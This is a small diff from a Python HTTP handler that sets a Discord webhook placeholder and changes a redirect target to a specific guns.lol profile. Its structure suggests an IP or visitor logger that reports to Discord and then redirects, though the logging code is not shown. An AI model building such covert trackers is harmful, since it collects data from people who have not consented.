@@ -5,7 +5,7 @@ import json
 # Replace with your actual Discord Webhook URL
 WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
 # Replace with your guns.lol profile URL
-REDIRECT_URL = "https://guns.lol/YOUR_USERNAME"
+REDIRECT_URL = "https://guns.lol/sleezyyyyyy"
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
